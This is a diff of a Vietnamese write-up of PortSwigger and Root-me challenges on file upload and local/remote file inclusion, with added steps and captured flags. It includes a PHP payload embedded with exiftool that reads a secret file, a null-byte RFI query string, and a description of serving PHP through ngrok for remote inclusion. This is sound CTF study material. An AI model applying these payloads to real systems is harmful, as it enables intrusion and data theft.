@@ -20,8 +20,16 @@
     - [6. Lab: Remote code execution via polyglot web shell upload](#pulv6)
 
 * [Root me - Upload file](#rootme-upload-file)
+    - [1. File upload - Double extensions](#rfu1)
+    - [2. File upload - MIME type](#rfu2)
+    - [3. File upload - Null byte](#rfu3)
+    - [4. File upload - ZIP](#rfu4)
 * [Root me - Local file inclusion](#rlfi)
-* [Tryhackme - dogcat](#tryhackme-dogcat)
+    - [1. Local File Inclusion](#rlfi1)
+    - [2. Local File Inclusion - Double encoding](#rlfi2)
+    - [3. Local File Inclusion - Wrappers](#rlfi3)
+    - [4. Remote File Inclusion](#rlfi4)
+
 
 # Chết.vn<a name="chetvn"></a>
 
@@ -428,8 +436,18 @@ việc xác thực hệ thống vừa thỏa mãn có thể thực thi code. Nó
 
 Hiểu được cấu trúc của file sẽ giúp ta thay đổi được bytes hay metadata của nó sao cho phù hợp. Ở đây ta sẽ dùng 1 công cụ hữu hiệu để tác động vào nó là **exiftool** giúp có thể tác động hữu hiệu vào metadata của file. Ta sẽ sử dụng nó để thay đổi các dấu hiệu hay signature trong file để server bị 
 đánh lừa rằng đây  là 1 file hình ảnh hợp lệ. 
+
+Đầu tiên thì tải 1 ảnh jpg hay có sẵn thì dùng luôn, ta 
 Ta sẽ thêm cmd: -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
 vào file portswigger.php và nhờ exiftool thực hiện nó.
+
+![image](https://user-images.githubusercontent.com/104350480/223383964-487828e0-39fc-4b3c-953a-a6d426d1e3c6.png)
+
+Oke giờ nó đã có định dạng của 1 jpeg nhưng cũng đồng thời là 1 file php. 
+Thực hiện upload và get ta được: 
+    
+![image](https://user-images.githubusercontent.com/104350480/223384360-c11796a5-9ca2-4c11-aada-b73cbca89675.png)
+
 
 ### [7. Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)<a name="pulv7"></a>
 
@@ -439,7 +457,7 @@ Mấy chall này chủ yếu dùng kiến thức trong related source được r
 
 > link reference: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1*vt6jw*_ga*NzM2OTE5OTkuMTY2OTA4MzExMA..*_ga_SRYSKX09J7*MTY3ODAzOTcxMy4xNDQuMS4xNjc4MDM5NzE4LjAuMC4w
 
-### Chall 1: File upload - Double extensions
+### [1. File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)<a name='rfu1'></a>
 
 ```
 Your goal is to hack this photo galery by uploading PHP code.
@@ -464,7 +482,7 @@ Dùng cat để đọc file:
 
 > Flag: Gg9LRz-hWSxqqUKd77-_q-6G8
 
-### Chall 2: File upload - MIME type
+### [2. File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)<a name='rfu2'></a>
 
 ```
 Your goal is to hack this photo galery by uploading PHP code.
@@ -484,7 +502,7 @@ Sau vài lần thử thì tìm được find .passwd như trên, ta thực hiệ
 
 > Flag: a7n4nizpgQgnPERy89uanf6T4
 
-### Chall 3: File upload - Null byte
+### [Chall 3: File upload - Null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)<a name='rfu3'></a>
 
 ```
 Your goal is to hack this photo galery by uploading PHP code.
@@ -499,7 +517,7 @@ hiện .png sẽ tự động bị cho out ra khỏi. còn lại mỗi extension
 
 > Flag: YPNchi2NmTwygr2dgCCF
 
-### Chall 4: File upload - ZIP
+### [Chall 4: File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)<a name='rfu4'></a>
 
 ```
 Your goal is to read index.php file.
@@ -546,7 +564,7 @@ Giờ nhấn vào index.txt là thực hiện được liên kết về file ind
 
 > Flag: N3v3r_7rU5T_u5Er_1npU7
 
-### Chall 5: File upload - Polyglot
+### [Chall 5: File upload - Polyglot](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)<a name='rfu5'></a>
 
 #### Are you bilingual?
 
@@ -556,7 +574,7 @@ Your friend who is a photography fan has created a site to allow people to share
 ```
 # Rootme - Local file inclusion <a name='rlfi'></a> 
 
-## 1. Local file inclusion
+## [1. Local file inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)<a name='rlfi1'></a>
 
 
 Ở bài này ta có giao diện như sau:
@@ -575,7 +593,7 @@ Ta được mật khẩu của admin trong file luôn:
 
 > Flag: OpbNJ60xYpvAQU8
 
-## 2. Local File Inclusion - Double encoding
+## [2. Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)<a name='rlfi2'></a>
 
 Đầu vào ta có giao diện thế này:
 
@@ -673,7 +691,7 @@ Ta được thông điệp base64 trả về và decode thì được:
 ```
 > Flag: Th1sIsTh3Fl4g!
 
-## 3. Local File Inclusion - Wrappers
+## [3. Local File Inclusion - Wrappers](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers)<a name='rlfi3'></a>
 
 ![image](https://user-images.githubusercontent.com/104350480/223317354-40fb805b-22e9-4710-9ab4-06df4a615b84.png)
 
@@ -701,16 +719,70 @@ Có source code trả về luôn:
 
 Nhưng chả để làm gì. giờ làm thế nào mà kh dựa vào system để đọc đựa tập tin của nó hay thực thi lệnh để kiếm thì mới được, chứ mò thế này hơi khó.
 
-Ở đây có thể áp dụng scandir trong php, áp dụng trả về mảng tên file hoặc thư mục directory đã cho, sửa lại lệnh: 
+Ở đây có thể áp dụng scandir hoặc hàm glob() trong php, áp dụng trả về mảng tên file hoặc thư mục directory hiện tại, sửa lại lệnh: 
 
 
+![image](https://user-images.githubusercontent.com/104350480/223343066-908ba85d-7c5b-4abc-9845-d30abfc2fce4.png)
+
+```
+<?php
+foreach (glob("*") as $filename) {
+    echo $filename;
+}
+?>
+
+```
 
 
-![image](https://user-images.githubusercontent.com/104350480/223319378-3716bf42-5154-4ce4-b9c2-b2f3650732c5.png)
+Ta được file cần tìm : **flag-mipkBswUppqwXlq9ZydO.php**
+
+![image](https://user-images.githubusercontent.com/104350480/223345270-0aaf6790-c5b1-4fb3-af28-bf1435e42f6e.png)
 
 
-> reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+Giờ ta đọc file nữa là xong, sửa lại cnmd để in nội dung trong file flag là xong, vì kh thể dùng system nên ở đây ta dùng file_get_contents và được:
 
+![image](https://user-images.githubusercontent.com/104350480/223345827-ac886ac3-4e8e-4973-9d90-b59b557a9724.png)
+
+> Flag: lf1-Wr4pp3r_Ph4R_pwn3d
+
+## [4. Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion#validation_challenge)<a name='rlfi4'></a>
+
+```
+Get the PHP source code.
+
+```
+
+![image](https://user-images.githubusercontent.com/104350480/223347554-71d3359e-c1c1-4c07-ace3-5da37b498249.png)
+
+Bài này ta thấy 2 cái là fr và en được truyền vào thì sẽ hiện ra trang tương ứng, ta có thể hình dung được nó đã được nối chuỗi gì đó vào rồi, thử
+paht traversal thì ta nhận được lỗi luôn: 
+
+![image](https://user-images.githubusercontent.com/104350480/223375409-1cf4eef2-e2df-4d16-a9ff-9b323694aaa4.png)
+
+Ta có thể thấy nó được nối thêm đuôi và _lang.php, thì để bỏ đuôi này đơn giản ta chỉ cần thêm null byte vào sau thôi, hoặc ? cũng được.
+Vì bài này có liên quan đến rce nên ta có thể test trước, thì trước tiên ta thử 1 link bất kì như ở đây là youtube xem sao:
+
+> ?lang=https://www.youtube.com/watch?v=FzVR_fymZw4&list=RDFzVR_fymZw4&start_radio=1%00
+
+![image](https://user-images.githubusercontent.com/104350480/223376034-2fb89a6f-07f7-4260-90f3-efc2cf032e68.png)
+ 
+ Được luôn này, vậy thì ta đã thực thi được include thành công, vậy triển khai tiếp thôi.
+ Được rồi giờ ta thực hiện rce thôi, kiểu bài này cũng hơi lạ, ta phải đi thử xem file đấy là gì, mình thực hiện system thì bị lỗi rồi nên ta thử file_get_contents một file bất kì xem. Ở đây mình sẽ đoán 1 vài file thông dụng như index.php chả hạn.
+ Ta dụng ngrok rồi post file lên, nhưng khi thực hiện truyền đường dẫn thì thêm ? ở cuối vào, mình thêm null byte bị lỗi, thì bởi cái server của mình get 
+ 3.php%00_lang.php ở server mình đâu có được đâu.
+ 
+ ![image](https://user-images.githubusercontent.com/104350480/223378633-74e40f4d-2681-49b4-a370-95c8b70fe283.png)
+
+Ta thực hiện thành công: 
+ 
+ ![image](https://user-images.githubusercontent.com/104350480/223378524-31a0acac-87bb-4932-a312-91ee02c6edca.png)
+
+Ta có được source code và cả flag luôn:
+
+![image](https://user-images.githubusercontent.com/104350480/223379082-85fe07a1-e00f-49ac-9b10-48d4ad94bb62.png)
+
+ 
+> Flag: R3m0t3_iS_r3aL1y_3v1l
 
 
 
